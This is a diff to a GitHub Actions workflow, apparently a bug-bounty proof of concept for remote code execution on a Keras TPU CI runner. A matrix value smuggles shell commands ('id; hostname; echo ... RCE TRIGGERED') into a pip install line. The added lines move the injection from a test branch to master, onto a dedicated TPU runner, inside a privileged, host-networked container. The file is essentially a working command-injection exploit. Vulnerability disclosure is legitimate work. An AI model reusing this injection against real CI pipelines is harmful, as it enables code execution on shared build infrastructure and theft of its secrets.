@@ -1,18 +1,17 @@
-name: Keras TPU RCE Demonstration
+name: Keras TPU Original Runner Proof
 on:
   push:
-    branches: [ vrp-rce-test ]
-
+    branches: [ master ]
 jobs:
-  tpu-test:
-    runs-on: ubuntu-latest
+  test-in-container:
+    runs-on: linux-x86-ct6e-44-1tpu
     strategy:
       matrix:
-        # We add '|| true' to bypass the pip error and force the shell to continue
-        backend: ["jax-tpu.txt || id; hostname; echo '--- VULNERABILITY CONFIRMED ---'; #"]
+        backend: ["jax; id; hostname; echo '--- RCE TRIGGERED ---'; #"]
+    container:
+      image: python:3.11-slim
+      options: --privileged --network host
     steps:
       - uses: actions/checkout@v4
-      - name: Install dependencies
-        run: |
-          # Note: We remove the '-tpu.txt' suffix from the run line to match our payload
-          pip install --no-cache-dir -r requirements-${{ matrix.backend }}
+      - name: Install Dependencies
+        run: pip install --no-cache-dir -r requirements-${{ matrix.backend }}-tpu.txt
